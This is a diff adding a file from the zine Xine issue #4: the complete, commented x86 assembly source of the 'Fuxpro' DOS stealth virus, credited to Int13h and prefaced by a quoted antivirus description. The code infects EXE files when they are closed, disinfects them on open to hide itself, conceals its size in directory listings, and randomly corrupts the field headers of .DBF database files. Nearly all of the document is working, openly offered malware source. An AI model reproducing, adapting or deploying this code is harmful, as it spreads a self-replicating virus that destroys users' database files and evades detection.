@@ -1,0 +1,735 @@
+   ;
+   ;                                         /-----------------------------\
+   ;                                         | Xine - issue #4 - Phile 306 |
+   ;                                         \-----------------------------/
+   ;
+   ;
+   ; Comment ‘
+   ;       ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ Fuxpro ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
+   ;       º Name  : Fuxpro                                                  º
+   ;       º Alias : None                                                    º
+   ;       º Origin: Paraguay                                                º
+   ;       º                                                                 º
+   ;       º  This is a stealth virus.  It infects EXE files when they are   º
+   ;       º  closed and disinfects then when they're opened.It tunnels to   º
+   ;       º  find the original Int 21h handler, with a routine similar to   º
+   ;       º  the  one  used  by the Killer Virus. It marks infected files   º
+   ;       º  setting the seconds to 62. Installs his dummy error trapper.   º
+   ;       º  The following text is found inside the virus code:             º
+   ;       º                                                                 º
+   ;       º           [FUXPRO Virus by Int13h * MaDe In PaRaGuAy]           º
+   ;       º                                                                 º
+   ;       º  This message is never displayed. The virus alters the header   º
+   ;       º  of  the  files with extension .DBF when they are opened. The   º
+   ;       º  .DBF is the extension for the database files, used by Foxpro,  º
+   ;       º  DBase  and many other database oriented languages. The virus   º
+   ;       º  reads the header and modifies completelly the header randomi-  º
+   ;       º  cally creating a quick caos in the user's database files.      º
+   ;       º                                                                 º
+   ;       ÈÍÍ[Analysis: Mikko Hiponnen, Data Fellows Ltd's FuckProt Prof.]ÍÍ¼
+   ; ‘
+   ;         ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;
+   ;       ;  I haven't  a  description of the DBF header. I just looked at ;
+   ;       ;  some .DBF files and then I found the header too easy to under-;
+   ;       ;  stand and to make caos with it :) but with the DBF header des-;
+   ;       ;  cription  the  joke can be multiplied.Sorry 4 my poor english.;
+   ;       ;  Note  that  this  is  one of my old viruses, I put it here to ;
+   ;       ;  fill some spaces :)                                           ;
+   ;       ;                                                                ;
+   ;       ;                                                          cd 13 ;
+   ;        ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ;   ; ;
+
+   .model tiny
+   .code
+   jumps                                   ; Fix it if u want. I am lazy :)
+   org 0h
+
+   ViralSize     equ   (offset MicroShit-offset Fuxpro)
+   ParraVir1     equ   ((ViralSize+1034+15)/16)+1
+   ParraVir2     equ   ((ViralSize+1034+15)/16)
+   ViralPara     equ   (ViralSize+15)/16
+
+   FUXPRO: call    Delta
+   Delta:  mov     bx,sp
+           mov     bp,ss:word ptr [bx]
+           inc     sp
+           inc     sp
+           sub     bp,offset delta         ; Get delta
+
+           mov     ax,'FX'                 ; Are we alive?
+           int     21h
+
+           cmp     ax,'PR'
+           je      FuxproYaReside          ; Yes, we r
+
+           push    es
+           push    ds
+           mov     ax,3521h                ; Grab int 21h's vector
+           int     21h
+           cld
+           mov     cs:[bp+word ptr Vieja21h],bx
+           mov     cs:[bp+word ptr Vieja21h+2],es
+
+           mov     ah,52h                  ; Look 4 the original entry point
+           int     21h
+           lds     si,es:[bx+4]
+           lds     si,ds:[si-4]
+   Rastrear:
+           dec     si
+           cmp     word ptr ds:[si],0e18ah
+           jne     Rastrear
+           cmp     byte ptr ds:[si+2],0ebh
+           jne     Rastrear
+   Buscar_cli:
+           lodsb
+           sub     al,0fah
+           jnz     Buscar_cli
+           cmp     word ptr ds:[si],0fc80h
+           jne     Buscar_cli
+           dec     si
+           mov     cs:[bp+word ptr Real21h],si
+           mov     cs:[bp+word ptr Real21h+2],ds
+
+           pop     ds
+
+           mov     ax,ds
+           dec     ax
+           mov     es,ax
+           mov     ax,es:[3]
+           sub     ax,ParraVir1
+           xchg    bx,ax
+           push    ds
+           pop     es
+
+           mov     ah,4ah                  ; Free memory
+           int     21h
+
+           mov     ah,48h                  ; Allocate mem
+           mov     bx,ParraVir2
+           int     21h
+
+           dec     ax
+           mov     es,ax
+           mov     word ptr es:[1],8       ; DOS's
+           inc     ax
+           mov     es,ax
+           xor     di,di
+
+           push    cs
+           pop     ds
+           lea     si,[bp+offset Fuxpro]   ; Move virus to mem
+           mov     cx,(ViralSize+1034)
+           rep     movsb
+
+           int     03h                     ; What I am doing here? Ask TASM!
+
+           push    es
+           pop     ds
+           mov     ax,2521h                ; Hook the inty
+           mov     dx,offset Maldita21h
+           int     21h
+
+           pop     es
+
+   FuxproYaReside:
+           push    es
+           pop     ds
+           mov     ax,es
+           add     ax,10h                  ; Restore control to the hoste
+           add     cs:[(bp+CS_IP)+2],ax
+
+           cli
+           add     ax,cs:[(bp+SS_SP)+2]
+           mov     ss,ax
+           mov     sp,cs:[(bp+SS_SP)]
+           sti
+
+           xor     ax,ax
+           xor     bx,bx
+           xor     cx,cx
+           xor     dx,dx
+           xor     si,si
+           xor     di,di
+           xor     bp,bp
+
+           db      0ebh,0h
+           db      0eah
+           CS_IP   dw offset MicroShit,0h
+           SS_SP   dw 0,0
+
+
+           db      ' [FUXPRO Virus by Int13h * MaDe In PaRaGuAy] '
+
+
+
+   DescuajarLaCabeceraDelMalditoArchivoTipoDBF:
+           mov     ax,03d02h
+           pushf
+           call    dword ptr cs:[Real21h]  ; Open the database
+           xchg    bx,ax
+
+           call    HoOk_24h
+           call    PointerToApocalipsis
+
+           or      dx,dx
+           jnz     Lectura                 ; Not too small please...
+
+           cmp     ax,1666
+           jb      Cancelar
+
+   Lectura:call    PointerToGenesis
+           call    Segmentos
+
+           mov     ah,3fh
+           mov     dx,offset Buffer        ; Read 1024 bytes to our buffer
+           mov     cx,1024
+           int     21h
+
+           mov     si,dx
+           cmp     byte ptr [si],3         ; It is a real .DBF? Usually begins
+           je      Continuar               ; with a
+           cmp     byte ptr [si],0f5h      ; or a õ
+           jne     Cancelar
+
+   Continuar:
+           mov     si,offset Buffer        ; Point to the buffer
+           mov     cx,1024                 ; Read the whole buffer
+    Again: dec     cx
+           and     cx,cx                   ; Check our counter
+           je      Cancelar
+           lodsw                           ; Read a word
+           cmp     ax,200dh                ; It is the end of the header?
+           je      Hallado
+           cmp     ax,2a0dh                ; Maybe the 1§ reg is deleted...
+           jne     Again
+
+   Hallado:dec     si                      ; Rewind a byte
+           mov     di,si                   ; Save original position of EOH
+           mov     byte ptr [si],42        ; Mark 1§ reg as deleted (02ah)
+           mov     si,offset Buffer
+           add     si,43                   ; Go to the field descriptor
+   Seguimos:
+           mov     al,cs:[si]              ; Read type in AL
+           call    Cambiador               ; Do some nasty changes on the header
+           cmp     si,di                   ; Still below the End of Header?
+           jb      Seguimos
+
+           call    PointerToGenesis        ; G0t0 BOF
+
+           mov     ah,40h
+           mov     dx,offset Buffer        ; Write the modified header
+           mov     cx,1024
+           int     21h
+
+           jmp     Cancelar                ; And g0 0n
+
+   Cambiador:
+           cmp     al,'C'                  ; Character field?
+           je      Caracter
+           cmp     al,'N'                  ; Numeric field?
+           je      Numerico
+           cmp     al,'D'                  ; Date field?
+           je      Fecha
+           cmp     al,'L'                  ; Logical field?
+           je      Logical
+   ParaRetornar:
+           add     si,32                   ; Point to the next field
+           ret                             ; and return to caller
+
+
+   Caracter:                               ; Play with character fields
+           in      al,40h                  ; Read random byte from port 40h
+           cmp     al,200
+           ja      ParaRetornar            ; If above than 200 nothing to do
+           cmp     al,150                  ; If between 150-200 cut the length
+           ja      AlaMitad                ; in the middle
+           cmp     al,100                  ; If between 100-150 then substract
+           ja      Restarlo
+           and     al,7                    ; 0-7
+           test    al,al                   ; 0?
+           jnz     Sumarlo
+           mov     al,3                    ; Then, 3
+   Sumarlo:add     byte ptr cs:[si+5],al   ; Add AL, to the length of the field
+           jmp     short ParaRetornar      ; and return
+   AlaMitad:
+           mov     al,byte ptr cs:[si+5]   ; The number of characters
+           shr     al,1                    ; divide it
+           mov     byte ptr cs:[si+5],al   ; and write the new size
+           jmp     short ParaRetornar      ; dirty work finished
+   Restarlo:
+           and     al,7                    ; 0-7
+           inc     al                      ; can be 0, then INC
+           sub     byte ptr cs:[si+5],al   ; SUBstract AL from the current size
+           jmp     short ParaRetornar
+
+
+   Numerico:                               ; Play with numeric fields
+           in      al,40h                  ; Get the random byte
+           cmp     al,166                  ; If it is above than 166 return
+           ja      Retorno
+           cmp     al,66                   ; If below than 66 then, set the random
+           jb      Here                    ; number in the decimals field
+   Modify: mov     byte ptr cs:[si],'C'    ; If above than 66 convert the numeric
+           jmp     short ParaRetornar      ; field into a character one
+     Here: mov     byte ptr cs:[si+6],al   ; AL in the decimals field
+   Retorno:jmp     short ParaRetornar
+
+
+   Fecha:  in      al,40h                  ; Play with Date fiels
+           cmp     al,32                   ; If random is less than 32 then
+           jb      Modify                  ; converts the Date to Character
+           jmp     short Retorno
+
+
+   Logical:in      al,40h                  ; Play with Logical fields
+           cmp     al,132
+           ja      Retorno                 ; If below then 132 don't do nothing
+           mov     byte ptr cs:[si],'M'    ; Converts the Logical field to Memo
+           jmp     short Retorno
+
+
+   CANCELAR:
+           mov     ah,3eh                  ; Close the sucker
+           pushf
+           call    dword ptr cs:[Real21h]
+
+           push    cs
+           pop     ds
+
+           mov     ax,2524h                ; Unhook the error handler
+           lds     dx,dword ptr ds:[Vieja24h]
+           int     21h
+
+           pop     es ds di si dx cx bx ax
+           jmp     Interrupcion_21h
+
+
+
+
+   DeSiNfEcTaR:                            ; When a file is opened we check it...
+           push    ax bx cx dx si di ds es
+
+           push    ds
+           pop     es
+           cld
+           mov     di,dx
+           mov     cx,128
+           mov     al,'.'                  ; Look 4 the period
+           repne   scasb
+           jne     Conti
+
+           xchg    si,di
+           lodsw
+           or      ax,2020h
+           cmp     ax,'bd'                 ; .DB?
+           jne     Conti
+           lodsb
+           or      al,20h
+           cmp     al,'f'                  ; .DBF?
+           je      DescuajarLaCabeceraDelMalditoArchivoTipoDBF
+
+   Conti:  mov     ax,03d02h               ; Open
+           pushf
+           call    dword ptr cs:[Real21h]  ; Emulate the int call
+           xchg    bx,ax
+
+           mov     ax,5700h
+           int     21h
+           mov     word ptr cs:[Time],cx   ; Infected?
+           mov     word ptr cs:[Date],dx
+           and     cl,00011111b
+           cmp     cl,00011111b
+           jne     Closear
+
+           call    PointerToApocalipsis
+
+           sub     ax,26
+           xchg    dx,ax
+           mov     cx,ax                   ; Positionate pointer at EOF
+           mov     ax,4200h                ; where there is our EXE header copy
+           int     21h
+
+           call    Segmentos
+
+           mov     ah,3fh
+           mov     dx,offset Cabecera      ; Read the header in our buffer
+           mov     cx,1ah
+           int     21h
+
+           call    PointerToApocalipsis
+
+           sub     ax,ViralSize
+           xchg    dx,ax
+           mov     cx,ax                   ; Move pointer
+           mov     ax,4200h
+           int     21h
+
+           call    HoOk_24h                ; To prevent...
+
+           mov     ah,40h
+           xor     cx,cx                   ; Cut the virus from the file
+           xor     dx,dx
+           int     21h
+
+           call    PointerToGenesis        ; Pointer to BOF
+
+           mov     ah,40h
+           mov     cx,1ah
+           mov     dx,offset Cabecera      ; Write header
+           int     21h
+
+           mov     ax,5701h
+           mov     cx,word ptr [Time]      ; Restore date and time
+           and     cl,11100000b
+           or      cl,1                    ; Eliminate bad seconds
+           mov     dx,word ptr [Date]
+           int     21h
+
+   Closear:mov     ah,3eh                  ; Close the sucker
+           pushf
+           call    dword ptr cs:[Real21h]
+
+   PopearTodo:
+           push    cs
+           pop     ds
+
+           lds     dx,dword ptr ds:[Vieja24h]
+           mov     ax,2524h
+           int     21h
+           pop     es ds di si dx cx bx ax
+           jmp     Interrupcion_21h
+
+
+   Stealth1:                               ; These routines are very common...
+           pushf
+           call    dword ptr cs:[Real21h]
+           or      al,al
+           jne     FuckingErr
+
+           push    ax
+           push    bx
+           push    es
+
+           mov     ah,62h
+           int     21h
+
+           mov     es,bx
+           cmp     bx,es:[16h]
+           jne     Napue
+
+           mov     bx,dx
+           mov     al,[bx]
+           push    ax
+
+           mov     ah,2fh
+           int     21h
+           pop     ax
+           inc     al
+           jne     FCBOrdinario
+           add     bx,7
+
+   FCBOrdinario:
+           mov     al,byte ptr es:[bx+17h]
+           and     al,00011111b
+           cmp     al,00011111b
+           jne     Napue
+
+           cmp     word ptr es:[bx+1dh],(ViralSize+1024)
+           ja      Restar
+
+           cmp     word ptr es:[bx+1fh],0
+           je      Napue
+
+   Restar: sub     word ptr es:[bx+1dh],ViralSize
+           sbb     word ptr es:[bx+1fh],0000
+           and     byte ptr es:[bx+17h],1
+
+   Napue:  pop     es
+           pop     bx
+           pop     ax
+   FuckingErr:
+           retf    2
+
+
+
+   ; My INT 21h handler
+
+   MaLdItA21H:
+           cmp     ax,'FX'                 ; TSR checking
+           je      ChEqUeO
+           cmp     ah,3dh                  ; Opening
+           je      DeSiNfEcTaR
+           cmp     ah,3eh                  ; Closing
+           je      InFeCtAr
+           cmp     ah,11h                  ; Stealth me
+           je      Stealth1
+           cmp     ah,12h                  ; Stealth me
+           je      Stealth1
+           cmp     ah,4eh                  ; Stealth me
+           je      Stealth2
+           cmp     ah,4fh                  ; Stealth me
+           je      Stealth2
+   Interrupcion_21h:
+           db      0eah
+     Vieja21h      dd 0
+   ChEqUeO:mov     ax,'PR'                 ; You are TSR
+           iret
+
+
+   Stealth2:
+           pushf
+           call    dword ptr cs:[Real21h]
+           jc      Aqueronte
+
+           pushf
+           push    ax
+           push    es
+           push    bx
+
+           mov     ah,2fh
+           int     21h
+
+           mov     ax,es:[bx+16h]
+           and     al,00011111b
+           cmp     al,00011111b
+           jne     Grrr
+
+           cmp     word ptr es:[bx+1ah],(ViralSize+1024)
+           jb      Grrr
+
+           sub     word ptr es:[bx+1ah],ViralSize
+           sbb     word ptr es:[bx+1ch],0000
+           and     byte ptr es:[bx+16h],1  ; Hide, hide, hide
+   Grrr:   pop     bx
+           pop     es
+           pop     ax
+           popf
+   Aqueronte:
+           retf    2
+
+
+
+   InFeCtAr:
+           cmp     bx,4                    ; 5 or above please
+           jbe     AqUi
+
+           push    ax bx cx dx si di ds es
+
+           call    HoOk_24h
+
+           push    bx
+           mov     ax,1220h
+           int     2fh
+
+           mov     ax,1216h
+           xor     bh,bh
+           mov     bl,es:[di]
+           int     2fh                     ; SFT
+           pop     bx
+
+           cmp     word ptr es:[di+29h],'EX'
+           jne     PopAll
+           cmp     byte ptr es:[di+28h],'E' ; .EXE?
+           jne     PopAll
+
+           mov     byte ptr es:[di+4],20h  ; set attrib 20h
+           mov     byte ptr es:[di+2],2    ; Read/write axs
+
+           mov     word ptr cs:[Handle],bx
+           mov     ax,5700h
+           int     21h
+           mov     word ptr cs:[Time],cx
+           mov     word ptr cs:[Date],dx
+           and     cl,00011111b            ; Infected?
+           cmp     cl,00011111b
+           je      PopAll
+
+           call    Segmentos
+           call    PointerToGenesis
+
+           mov     ah,3fh
+           mov     cx,1ah                  ; The header
+           mov     dx,offset Cabecera
+           int     21h
+
+           mov     si,dx
+           cmp     word ptr [si],'ZM'
+           je      IsEXE
+           cmp     word ptr [si],'MZ'
+           jne     PopAll                  ; MZ or ZM present?
+
+   IsEXE:  cmp     byte ptr [si+24],'@'    ; Windoze sucks
+           jae     PopAll
+
+           les     ax,dword ptr [Cabecera+014h]
+           mov     [CS_IP],ax
+           mov     [CS_IP+2],es            ; Grab important stuff
+           les     ax,dword ptr [Cabecera+0eh]
+           mov     word ptr [SS_SP],es
+           mov     word ptr [SS_SP+2],ax
+
+           call    Segmentos
+
+           call    PointerToApocalipsis
+           push    dx
+           push    ax
+
+           cmp     ax,1024                 ; Not too small
+           jb      PopAll
+
+           call    HoOk_24h
+
+           mov     ah,40h
+           mov     bx,word ptr [Handle]
+           mov     cx,ViralSize            ; Add virus to EOF
+           xor     dx,dx
+           int     21h
+
+           call    PointerToGenesis
+
+           pop     ax
+           pop     dx
+           push    dx
+           push    ax
+
+           mov     ax,word ptr [Cabecera+08h]
+           mov     cl,4
+           shl     ax,cl                   ; Modify header in the habitual way
+           xchg    bx,ax
+           pop     ax
+           pop     dx
+           push    ax
+           push    dx
+           sub     ax,bx
+           sbb     dx,0
+           mov     cx,10h
+           div     cx
+           mov     word ptr [Cabecera+014h],dx
+           mov     word ptr [Cabecera+016h],ax
+           mov     word ptr [Cabecera+0eh],ax
+           mov     word ptr [Cabecera+010h],0
+
+           pop     dx
+           pop     ax
+
+           add     ax,ViralSize
+           adc     dx,0
+           mov     cl,9
+           push    ax
+           shr     ax,cl
+           ror     dx,cl
+
+           xchg    bx,bx
+
+           stc
+           adc     dx,ax
+           pop     ax
+           and     ah,1
+           mov     word ptr [Cabecera+4],dx
+           mov     word ptr [Cabecera+2],ax
+
+           mov     ax,word ptr [Cabecera+0ah]
+           clc
+           add     ax,ViralPara
+           jc      Donotadd
+           mov     word ptr [Cabecera+0ah],ax
+   Donotadd:
+           mov     word ptr [Cabecera+0Ch],0ffffh
+
+           mov     bx,word ptr [Handle]
+           mov     ah,40h
+           mov     cx,01ah                 ; Write modified header
+           mov     dx,offset Cabecera
+           int     21h
+
+           db      0b9h
+           Time    dw 0
+           and     cl,11100000b            ; Restore time & date
+           or      cl,00011111b            ; set seconds to 62
+           db      0bah
+           Date    dw 0
+           mov     ax,5701h
+           int     21h
+
+   PopAll: push    cs
+           pop     ds
+
+           mov     ax,2524h                ; Unhook int 24h
+           lds     dx,dword ptr [Vieja24h]
+           int     21h
+
+           pop     es ds di si dx cx bx ax
+   Aqui:   jmp     Interrupcion_21h
+
+
+
+   Hook_24h:
+           push    es
+           push    bx
+
+           mov     ax,3524h                ; Trap the trapper
+           int     21h
+           mov     word ptr cs:[Vieja24h],bx
+           mov     word ptr cs:[Vieja24h+2],es
+           push    cs
+           pop     ds
+
+           mov     ax,2524h
+           mov     dx,offset Manejador24h
+           int     21h
+           pop     bx
+           pop     es
+           ret
+
+
+   Manejador24h:
+           mov     al,03                   ; Nothing is wrong
+           iret
+
+
+   Segmentos:
+           push    cs cs
+           pop     ds es                   ; ES=DS=CS
+           ret
+
+
+   PointerToGenesis:
+           mov     ax,04200h               ; BOF
+           jmp     short Desplazar
+   PointerToApocalipsis:
+           mov     ax,04202h               ; EOF
+   Desplazar:
+           xor     cx,cx
+           cwd
+           int     21h
+           ret
+
+   Cabecera        db 01ah dup(0)          ; The copy of the header will go here
+
+   MicroShit:
+   Handle          dw 0
+   Vieja24h        dd 0
+   Real21h         dd 0
+   Buffer          db 1024 dup (0)
+           mov     ax,4c00h
+           int     21h
+   End FUXPRO
+
+   ;Virus                                       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+   ;     Virus                                  ÀÄÄÄ¿           ³
+   ;          Virus       Ü            Ü            ³   ÚÄÄÄÄ¿  ³
+   ;               Virus  ßÛÜ        ÜÛß            ³   ³    ³  ³
+   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿    ßÛÜ      ÜÛß             ³   ÀÄÄÄÄÙ  ³
+   ;³ ÚÄÄ¿  ÚÄÄÄÄÄÄÄ¿ ³     ßÛÜ    ÜÛß              ³           ³
+   ;ÀÄÙ  ³  ³       ÀÄÙ      ßÛÜ  ÜÛß               ³ ÚÄÄÄ¿ ÚÄÄÄÙ
+   ;     ³  ÀÄÄÄÄÄ¿           ßÛÜÜÛß                ³ ³   ³ ³
+   ;     ³  ÚÄÄÄÄÄÙ            ßÛÛß                 ³ ³   ³ ÀÄÄ¿    ÜßßßßßßÜ
+   ;     ³  ³      ÚÄ¿  ÚÄ¿    ÜÛÛÜ      ÚÄÄÄÄÄÄÄÄ¿ ³ ³   ÀÄÄ¿ ³    Û      Û
+   ;     ³  ³      ³ ³  ³ ³   ÜÛßßÛÜ     ³ ÚÄÄÄÄ¿ ³ ³ ³      ³ ÀÄ¿  Û      Û
+   ;     ³  ³      ³ ³  ³ ³  ÜÛß  ßÛÜ    ³ ³    ³ ³ ³ ³      ÀÄ¿ ³  Û      Û
+   ;   ÚÄÙ  ÀÄ¿    ³ ÀÄÄÙ ³ ÜÛß    ßÛÜ   ³ ÀÄÄÄÄÙ ³ ³ ³        ³ ³  ßÜÜÜÜÜÜß
+   ;   ÀÄÄÄÄÄÄÙ    ÀÄÄÄÄÄÄÙÜÛß      ßÛÜ  ³ ÚÄÄÄÄÄÄÙ ÀÄÙ        ÀÄÙ
+   ;                      Ûß          ßÛ ³ ³        C0d3d by  Int13h
+   ;                                     ³ ³        M4d3 in P4r4gu4y
+   ;                                     ³ ³          South Am3ric4
+   ;                                     ÀÄÙ
